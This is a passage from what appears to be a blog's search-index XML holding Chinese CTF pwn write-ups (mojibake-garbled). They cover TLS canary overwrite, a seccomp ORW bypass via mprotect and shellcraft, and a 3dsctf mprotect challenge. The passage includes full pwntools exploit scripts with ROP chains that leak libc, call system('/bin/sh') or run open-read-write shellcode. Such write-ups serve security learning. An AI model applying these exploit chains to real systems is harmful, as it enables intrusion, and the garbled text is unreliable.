      <title>ä¿®æ”¹tls</title>
      <link href="/posts/33489/"/>
      <url>/posts/33489/</url>
      
        <content type="html"><![CDATA[<h2 id="çŸ¥è¯†ç‚¹ï¼š"><a href="#çŸ¥è¯†ç‚¹ï¼š" class="headerlink" title="çŸ¥è¯†ç‚¹ï¼š"></a>çŸ¥è¯†ç‚¹ï¼š</h2><p>(1)gdbä¸­ä½¿ç”¨<code>fsbase</code>æŒ‡ä»¤å¯è·å¾—fså¯„å­˜å™¨çš„å€¼</p><p>(2)TLSï¼ˆçº¿ç¨‹å±€éƒ¨å‚¨å­˜ï¼‰ï¼šé˜²æ­¢å½“ä¸€ä¸ªçº¿ç¨‹å¡æ­»åå¯¹å…¶å®ƒçº¿ç¨‹å¯¹å…¨å±€å˜é‡æˆ–è¯¥å‡½æ•°å†…çš„staticå˜é‡çš„ä½¿ç”¨äº§ç”Ÿå½±å“ï¼Œä¼šåœ¨è¯¥çº¿ç¨‹å¼€å§‹æ—¶ï¼Œæ‹·è´ä¸€ä»½å…¨å±€å˜é‡å’Œstaticå˜é‡åˆ°TLSæ®µã€‚çº¿ç¨‹çš„TLSæ®µä¸€èˆ¬å’Œæ ˆæ®µæŒ¨å¾—å¾ˆè¿‘</p><p>(3)çº¿ç¨‹é¢˜çš„canaryæ¯”è¾ƒï¼šçº¿ç¨‹é¢˜çš„canaryæ˜¯æŠŠæ ˆæ®µçš„canaryå’ŒTLSæ®µçš„å‰¯æœ¬è¿›è¡Œæ¯”è¾ƒï¼Œæ‰€ä»¥è¦ç»•è¿‡canaryçš„è¯ï¼Œå¯ä»¥å°†æ ˆæ®µå’ŒTLSæ®µçš„canaryå‡è¦†ç›–æˆç›¸åŒçš„å€¼</p><p>(4)åœ¨ glibc å®ç°ä¸­ï¼ŒTLS ç”±æ®µå¯„å­˜å™¨<code>fs</code>ï¼ˆx86-64 æ¶æ„ï¼‰æŒ‡å‘ã€‚<code>TLS</code>åœ¨ <code>glibc</code>ä¸­çš„å®ç°ä¸º <code>tcbhead_t(TCB)</code>ç»“æ„ä½“ï¼Œå…¶å®šä¹‰å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="type">void</span> *tcb;        <span class="comment">/* Pointer to the TCB.  Not necessarily the</span></span><br><span class="line"><span class="comment">                 thread descriptor used by libpthread.  */</span></span><br><span class="line">    <span class="type">dtv_t</span> *dtv;</span><br><span class="line">    <span class="type">void</span> *self;       <span class="comment">/* Pointer to the thread descriptor.  */</span></span><br><span class="line">    <span class="type">int</span> multiple_threads;</span><br><span class="line">    <span class="type">int</span> gscope_flag;</span><br><span class="line">    <span class="type">uintptr_t</span> sysinfo;</span><br><span class="line">    <span class="type">uintptr_t</span> stack_guard;   <span class="comment">// fs:0x28 canaryçš„å€¼</span></span><br><span class="line">    <span class="type">uintptr_t</span> pointer_guard;</span><br><span class="line">    ...</span><br><span class="line">  &#125; <span class="type">tcbhead_t</span>;</span><br></pre></td></tr></table></figure><p>canaryçš„å€¼å®é™…å‚¨å­˜åœ¨<code>stack_guard</code>è¿™ä¸€å˜é‡ä¸­,fs å¯„å­˜å™¨å®é™…æŒ‡å‘çš„æ˜¯å½“å‰æ ˆçš„ TLS ç»“æ„ï¼Œfs:0x28 æŒ‡å‘çš„æ­£æ˜¯ <code>stack_guard</code></p><p>çº¿ç¨‹å±€éƒ¨å­˜å‚¨ï¼ˆThread Local Storageï¼‰æ˜¯ä¸€ç§æœºåˆ¶ï¼Œé€šè¿‡è¯¥æœºåˆ¶åˆ†é…å˜é‡ï¼Œä»¥ä¾¿æ¯ä¸€ä¸ªç°å­˜çš„çº¿ç¨‹éƒ½æœ‰ä¸€ä¸ªå˜é‡å®ä¾‹ã€‚<br>å®ƒä¸»è¦æ˜¯ä¸ºäº†é¿å…å¤šä¸ªçº¿ç¨‹åŒæ—¶è®¿å­˜åŒä¸€å…¨å±€å˜é‡æˆ–è€…é™æ€å˜é‡æ—¶æ‰€å¯¼è‡´çš„å†²çªï¼Œå°¤å…¶æ˜¯å¤šä¸ªçº¿ç¨‹åŒæ—¶éœ€è¦ä¿®æ”¹è¿™ä¸€å˜é‡æ—¶ã€‚ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡TLSæœºåˆ¶ï¼Œä¸ºæ¯ä¸€ä¸ªä½¿ç”¨è¯¥å…¨å±€å˜é‡çš„çº¿ç¨‹éƒ½æä¾›ä¸€ä¸ªå˜é‡å€¼çš„å‰¯æœ¬ï¼Œæ¯ä¸€ä¸ªçº¿ç¨‹å‡å¯ä»¥ç‹¬ç«‹åœ°æ”¹å˜è‡ªå·±çš„å‰¯æœ¬ï¼Œè€Œä¸ä¼šå’Œå…¶å®ƒçº¿ç¨‹çš„å‰¯æœ¬å†²çªã€‚ä»çº¿ç¨‹çš„è§’åº¦çœ‹ï¼Œå°±å¥½åƒæ¯ä¸€ä¸ªçº¿ç¨‹éƒ½å®Œå…¨æ‹¥æœ‰è¯¥å˜é‡ã€‚è€Œä»å…¨å±€å˜é‡çš„è§’åº¦ä¸Šæ¥çœ‹ï¼Œå°±å¥½åƒä¸€ä¸ªå…¨å±€å˜é‡è¢«å…‹éš†æˆäº†å¤šä»½å‰¯æœ¬ï¼Œè€Œæ¯ä¸€ä»½å‰¯æœ¬éƒ½å¯ä»¥è¢«ä¸€ä¸ªçº¿ç¨‹ç‹¬ç«‹åœ°æ”¹å˜ã€‚</p><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡è¦†ç›–<code>rbp-8</code>å¤„å’Œ<code>fs:[0x28]</code>å¤„ä¸ºç›¸åŒçš„å€¼,å³å¯ç»•è¿‡canary</p><p><code>mov    rcx, qword ptr [rbp - 8]</code></p><p><code>xor    rcx, qword ptr fs:[0x28]</code></p><h2 id="é¢˜ç›®ï¼š"><a href="#é¢˜ç›®ï¼š" class="headerlink" title="é¢˜ç›®ï¼š"></a>é¢˜ç›®ï¼š</h2><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/img/202307242143831.png"></p><p>åšæå‰å…ˆç”¨patchelfå°†glibcä¿®æ”¹ä¸º2.23-0ubuntu11.3ï¼Œå¦åˆ™æœ‰å¯èƒ½è¦†ç›–fs:[0x28]å‰å°±ä¼šå´©æºƒ</p><p>ä¹‹åå°±æ˜¯æ ˆè¿ç§»+è¦†ç›–tlsï¼Œè´´ä¸‹wp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./bs&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./bs&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/home/miko/Desktop/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b *0x400992&#x27;)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;send?\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;6128&#x27;</span>)</span><br><span class="line">libc_main_got=elf.got[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line"><span class="comment">#start=0x400810</span></span><br><span class="line">put_plt=<span class="number">0x4007C0</span></span><br><span class="line">pop_rdi=<span class="number">0x400c03</span></span><br><span class="line">pop_rsi_r15=<span class="number">0x400c01</span></span><br><span class="line">leave_ret=<span class="number">0x400955</span></span><br><span class="line">read=<span class="number">0x4007E0</span></span><br><span class="line">bss=<span class="number">0x602310</span></span><br><span class="line">payload=<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">4104</span>+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">8</span>+p64(bss-<span class="number">0x8</span>)+p64(pop_rdi)+p64(libc_main_got)+p64(put_plt)</span><br><span class="line">payload+=p64(pop_rdi)+p64(<span class="number">0</span>)+p64(pop_rsi_r15)+p64(bss)+p64(<span class="number">0</span>)+p64(read)+p64(leave_ret)</span><br><span class="line">payload=payload.ljust(<span class="number">6128</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;goodbye.\n&#x27;</span>)</span><br><span class="line">true=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(true))</span><br><span class="line">libcbase=true-libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libcbase))</span><br><span class="line">system=libc.symbols[<span class="string">&#x27;system&#x27;</span>]+libcbase</span><br><span class="line">sh=<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))+libcbase</span><br><span class="line">p.recv()</span><br><span class="line">payload2=p64(pop_rdi)+p64(sh)+p64(system)</span><br><span class="line">p.send(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> stack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>warm_up-seccompæ²™ç®±(orw)</title>
      <link href="/posts/4673/"/>
      <url>/posts/4673/</url>
      
        <content type="html"><![CDATA[<p>æ£€æŸ¥ä¸‹ä¿æŠ¤</p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/pwn1/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-06-24%20100709.png" alt="å±å¹•æˆªå›¾ 2023-06-24 100709"></p><p>ä½¿ç”¨äº†seccompç³»ç»Ÿè°ƒç”¨ï¼Œä¹Ÿå°±æ˜¯è¯´å¼€äº†æ²™ç®±ï¼Œseccomp-toolsçœ‹çœ‹ç¦ç”¨äº†ä»€ä¹ˆ</p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/pwn1/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-06-24%20101358.png" alt="å±å¹•æˆªå›¾ 2023-06-24 101358"></p><p>ç¦ç”¨äº†execveç³»ç»Ÿè°ƒç”¨,systemç³»ç»Ÿè°ƒç”¨å®é™…ä¸Šä¼šè°ƒç”¨execve,æ‰€ä»¥é€šè¿‡system(â€˜&#x2F;bin&#x2F;shâ€™)æ¥getshellæ˜¯ä¸å¯èƒ½çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬æ¢ä¸ªæ€è·¯ï¼Œé€šè¿‡orwï¼Œå³openä¸€ä¸ªæ–‡ä»¶(å®é™…ä¸Šæ‰“å¼€çš„æ˜¯ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦)ï¼Œå°†æ–‡ä»¶çš„å†…å®¹readåˆ°å†…å­˜ä¸­ï¼Œå†å°†æ–‡ä»¶å†…å®¹writeåˆ°æ ‡å‡†è¾“å‡º(stdout)</p><p>çœ‹çœ‹æº¢å‡ºå‡½æ•°</p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/pwn1/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-06-24%20103437.png" alt="å±å¹•æˆªå›¾ 2023-06-24 103437"></p><p>gdbè°ƒè¯•åç§»ï¼Œå¡«å……24ä¸ªå­—èŠ‚åå°±æ˜¯canaryï¼Œcanaryæœ€ä½ä½ä¸º<code>\x00</code>,æ‰€ä»¥ç”¨ä»»æ„å­—ç¬¦å°†<code>\x00</code>è¦†ç›–æ‰ï¼Œé€šè¿‡printfå³å¯æ³„éœ²å‡ºcanary</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload1=<span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span></span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span>)</span><br><span class="line">canary=u64(p.recv(<span class="number">8</span>))-<span class="number">0xa</span></span><br></pre></td></tr></table></figure><p> ç»§ç»­è°ƒè¯•ï¼Œcanaryä¹‹åå¡«å……8ä¸ªå­—èŠ‚å°±æ˜¯è¿”å›åœ°å€ã€‚ä½†æ˜¯æˆ‘ä»¬è¦æƒ³orwå¾—åˆ°flagï¼Œå¿…é¡»å…ˆå†™å…¥orwçš„æœºå™¨ç ï¼Œaslrä¼šéšæœºåŒ–æ ˆçš„åœ°å€ã€‚æ‰€ä»¥æˆ‘ä»¬é€‰æ‹©å­˜æ”¾åœ¨<code>bssæ®µ</code>æˆ–<code>gotè¡¨</code></p><table><thead><tr><th></th><th><strong>ä½œç”¨ä½ç½®</strong></th><th><strong>å½’å±</strong></th><th><strong>ä½œç”¨æ—¶é—´</strong></th></tr></thead><tbody><tr><td>ASLR</td><td><strong>1</strong>ï¼šæ ˆåŸºåœ°å€ï¼ˆstackï¼‰ã€å…±äº«åº“ï¼ˆ.so\librariesï¼‰ã€mmap åŸºåœ°å€<br/><strong>2</strong>ï¼šåœ¨<strong>1</strong>åŸºç¡€ä¸Šï¼Œå¢åŠ éšæœºåŒ–å †åŸºåœ°å€ï¼ˆchunkï¼‰</td><td>ç³»ç»ŸåŠŸèƒ½</td><td>ä½œç”¨äºç¨‹åºï¼ˆELFï¼‰è£…å…¥å†…å­˜è¿è¡Œæ—¶</td></tr><tr><td>PIE</td><td>ä»£ç æ®µï¼ˆ .text ï¼‰ã€åˆå§‹åŒ–æ•°æ®æ®µï¼ˆ .data ï¼‰ã€æœªåˆå§‹åŒ–æ•°æ®æ®µï¼ˆ .bss ï¼‰</td><td>ç¼–è¯‘å™¨åŠŸèƒ½</td><td>ä½œç”¨äºç¨‹åºï¼ˆELFï¼‰ç¼–è¯‘è¿‡ç¨‹ä¸­</td></tr></tbody></table><p><em>Nx enabledä¿æŠ¤å¼€å¯ï¼Œå †æ ˆä¸å¯æ‰§è¡Œï¼Œæ•°æ®æ®µä¸å¯æ‰§è¡Œï¼Œä»£ç æ®µä¸å¯å†™</em></p><p><em>Globle offset tableå…¨å±€åç§»é‡è¡¨ï¼Œä½äºæ•°æ®æ®µ</em></p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/pwn1/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-06-24%20105930.png"></p><p>å¯ä»¥çœ‹åˆ°,gotè¡¨ä¸bssæ®µéƒ½æ²¡æœ‰å¯æ‰§è¡Œæƒé™ï¼Œæ‰€ä»¥éœ€è¦mprotectå‡½æ•°ä¿®æ”¹æƒé™ä¸º<code>0x7</code>ï¼Œåªæœ‰gotè¡¨çš„åœ°å€æ˜¯ä¸€ä¸ªå†…å­˜é¡µ<code>4k(0x1000)</code>çš„æ•´æ•°å€ï¼Œæ‰€ä»¥ä¿®æ”¹gotè¡¨æƒé™</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mprotect_offset=libc.symbols[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">gets=libc.symbols[<span class="string">&#x27;gets&#x27;</span>]+libcbase</span><br><span class="line">mprotect_true=libcbase+mprotect_offset</span><br><span class="line">payload2=<span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span>+p64(canary)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span></span><br><span class="line">payload2+=p64(rdi_ret)+p64(save)+p64(gets)</span><br><span class="line">payload2+=p64(rdi_ret)+p64(save)+p64(rsi_r15_ret)+p64(<span class="number">0x1000</span>)+p64(<span class="number">0</span>)+p64(rdx_ret)+p64(<span class="number">0x7</span>)+p64(<span class="number">0</span>)+p64(mprotect_true)+p64(save) <span class="comment">#å†™å®Œæœºå™¨ç åè·³è½¬åˆ°ç›¸åº”çš„å†…å­˜åŒºåŸŸ</span></span><br></pre></td></tr></table></figure><p>mprotectæœ‰ä¸‰ä¸ªå‚æ•°ï¼Œå¦‚æœROPgadgetæ‰¾ä¸åˆ°<code>pop rdx;ret</code>,æˆ‘ä»¬å¯ä»¥åœ¨libcä¸­æ‰¾åˆ°è¿™ä¸ªæŒ‡ä»¤ï¼Œå€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œlibcä¸­æ‰¾åˆ°çš„æŒ‡ä»¤ä¸ä¸€å®šæœ‰å¯æ‰§è¡Œæƒé™ï¼Œä½†<code>pop rdx;ret</code>æŒ‡ä»¤ä¹Ÿä¸æ˜¯åªæœ‰ä¸€ä¸ªï¼Œè¦å¤šè¯•è¯•</p><p><em>ROPgadget â€“binary &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6 â€“only â€˜pop|retâ€™ | grep rdx</em></p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/pwn1/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-06-24%20112730.png" alt="å±å¹•æˆªå›¾ 2023-06-24 112730"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload3 = shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;flag&#x27;</span>)</span><br><span class="line">payload3+ = shellcraft.read(<span class="number">0x3</span>, save_to, <span class="number">0x40</span>)</span><br><span class="line"><span class="comment">#æ–‡ä»¶æè¿°ç¬¦fd:æ˜¯æ–‡ä»¶æè¿°ç¬¦0\1\2\3,ä»£è¡¨æ ‡å‡†çš„è¾“å…¥è¾“å‡ºå’Œå‡ºé”™,å…¶ä»–æ‰“å¼€çš„æ–‡ä»¶</span></span><br><span class="line">payload3+ = shellcraft.write(<span class="number">0x1</span>, save_to, <span class="number">0x40</span>)</span><br><span class="line"><span class="comment">#æ–‡ä»¶æè¿°ç¬¦fd:æ˜¯æ–‡ä»¶æè¿°ç¬¦0\1\2\3,ä»£è¡¨æ ‡å‡†çš„è¾“å…¥è¾“å‡ºå’Œå‡ºé”™,å…¶ä»–æ‰“å¼€çš„æ–‡ä»¶</span></span><br></pre></td></tr></table></figure><p>expå¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./warm_up&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;139.129.76.65&#x27;,50007)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./warm_up&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">libc_main_got=elf.got[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">printf_plt=elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">rdi_ret=<span class="number">0x400bc3</span></span><br><span class="line">rsi_r15_ret=<span class="number">0x400bc1</span></span><br><span class="line">start=<span class="number">0x400910</span></span><br><span class="line">save=<span class="number">0x601000</span></span><br><span class="line">save_to=<span class="number">0x601080</span></span><br><span class="line">p.recv()</span><br><span class="line">payload1=<span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span></span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span>)</span><br><span class="line">canary=u64(p.recv(<span class="number">8</span>))-<span class="number">0xa</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(canary))</span><br><span class="line">p.recvuntil(<span class="string">b&#x27; ?&#x27;</span>)</span><br><span class="line">payload2=<span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span>+p64(canary)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(rdi_ret)+p64(<span class="number">0x400BEF</span>)+p64(rsi_r15_ret)</span><br><span class="line">payload2+=p64(libc_main_got)+p64(<span class="number">0</span>)+p64(printf_plt)+p64(start)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">true=u64(p.recvuntil(<span class="string">b&#x27; ?&#x27;</span>,drop=<span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">offset=libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">libcbase=true-offset</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libcbase))</span><br><span class="line">mprotect_offset=libc.symbols[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">gets=libc.symbols[<span class="string">&#x27;gets&#x27;</span>]+libcbase</span><br><span class="line">mprotect_true=libcbase+mprotect_offset</span><br><span class="line">rdx_ret=libcbase+<span class="number">0x000000000011f497</span></span><br><span class="line">p.recv()</span><br><span class="line">payload1=<span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span></span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27; ?&#x27;</span>)</span><br><span class="line"><span class="comment">#canary=u64(p.recv(8))-0xa</span></span><br><span class="line"><span class="comment">#print(hex(canary))</span></span><br><span class="line">payload2=<span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span>+p64(canary)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span></span><br><span class="line">payload2+=p64(rdi_ret)+p64(save)+p64(gets)</span><br><span class="line">payload2+=p64(rdi_ret)+p64(save)+p64(rsi_r15_ret)+p64(<span class="number">0x1000</span>)+p64(<span class="number">0</span>)+p64(rdx_ret)+p64(<span class="number">0x7</span>)+p64(<span class="number">0</span>)+p64(mprotect_true)+p64(save)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">p.sendline(payload2)</span><br><span class="line">payload3 = shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;flag&#x27;</span>)</span><br><span class="line">payload3+ = shellcraft.read(<span class="number">0x3</span>, save_to, <span class="number">0x40</span>)</span><br><span class="line">payload3+ = shellcraft.write(<span class="number">0x1</span>, save_to, <span class="number">0x40</span>)</span><br><span class="line">p.sendline(asm(payload3))</span><br><span class="line">p.recv()</span><br><span class="line"><span class="comment">#print(p.recv())</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> stack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>not_the_same_3dsctf_2016-mprotectæå‡æƒé™</title>
      <link href="/posts/17975/"/>
      <url>/posts/17975/</url>
      
        <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/pwn1/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-06-11%20100611.png"></p><p>è¿™é“é¢˜æœ‰ä¸¤ç§è§£æ³•ï¼Œä¸€ç§æ˜¯fgetsè¯»å–flagï¼Œå¦ä¸€ç§æ˜¯mprotectæå‡æƒé™ï¼Œè¿™é‡Œæˆ‘ä»¬åªä»‹ç»ç¬¬äºŒç§è§£æ³•</p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/pwn1/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-06-11%20102036.png"></p><p>checksecï¼Œé¢˜ç›®åªå¼€äº†æ ˆä¸å¯æ‰§è¡Œï¼Œå…¶ä»–ä¿æŠ¤æ²¡æœ‰å¼€å¯</p><blockquote><p>int mprotect(void *addr, size_t len, int prot);</p><p><strong>addr</strong>ï¼šä¿®æ”¹ä¿æŠ¤å±æ€§åŒºåŸŸçš„èµ·å§‹åœ°å€ï¼Œaddrå¿…é¡»æ˜¯ä¸€ä¸ªå†…å­˜é¡µçš„èµ·å§‹åœ°å€ï¼Œç®€è€Œè¨€ä¹‹ä¸ºé¡µå¤§å°ï¼ˆä¸€èˆ¬æ˜¯ 4KB &#x3D;&#x3D; 4096å­—èŠ‚ï¼‰æ•´æ•°å€ã€‚<br><strong>len</strong>ï¼šè¢«ä¿®æ”¹ä¿æŠ¤å±æ€§åŒºåŸŸçš„é•¿åº¦,æœ€å¥½ä¸ºé¡µå¤§å°æ•´æ•°å€ã€‚</p><p><strong>prot</strong>:  å†…å­˜çš„æƒé™  # 0x7 &#x3D;&#x3D; å¯è¯»å¯å†™å¯æ‰§è¡Œ</p><p>PROT_READï¼šå¯å†™ï¼Œå€¼ä¸º 1</p><p>PROT_WRITEï¼šå¯è¯»ï¼Œ å€¼ä¸º 2</p><p>PROT_EXECï¼šå¯æ‰§è¡Œï¼Œå€¼ä¸º 4</p><p>PROT_NONEï¼šä¸å…è®¸è®¿é—®ï¼Œå€¼ä¸º 0</p></blockquote><p>ç¨‹åºæœ‰mprotectå‡½æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç”¨mprotectå‡½æ•°ä¿®æ”¹<code>gotè¡¨</code>æˆ–<code>bssæ®µ</code>å†…å­˜åŒºåŸŸçš„æƒé™ä¸º<code>0x7</code></p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/pwn1/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-06-11%20104610.png"></p><p><code>ctrl+s</code>æ‰“å¼€ç¨‹åºçš„æ®µè¡¨ï¼Œè§‚å¯Ÿåˆ°bssæ®µçš„èµ·å§‹åœ°å€ä¸æ˜¯<code>4kb(0x1000)</code>çš„æ•´æ•°å€ï¼Œæ‰€ä»¥é€‰æ‹©ä¿®æ”¹gotè¡¨</p><p>å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œè¿™ä¸ªç¨‹åºæ²¡æœ‰å…³é—­è¾“å…¥è¾“å‡ºç¼“å†²åŒºï¼Œæ‰€ä»¥æˆ‘ä»¬<code>recv</code>ä¸åˆ°<code>b0r4 v3r s3 7u 4h o b1ch4o m3m0...</code> ç›´æ¥å‘é€æ•°æ®å³å¯</p><blockquote><p><strong>ç¼“å†²åŒºçš„ä¸‰ç§ç±»å‹</strong></p><p>1.å…¨ç¼“å†²</p><p>å®é™…çš„I&#x2F;Oæ“ä½œåªæœ‰åœ¨ç¼“å†²åŒºè¢«å¡«æ»¡äº†ä¹‹åæ‰ä¼šè¿›è¡Œã€‚flushæè¿°äº†æ ‡å‡†I&#x2F;Oç¼“å†²çš„å†™æ“ä½œã€‚ç¼“å†²åŒºå¯ä»¥ç”±æ 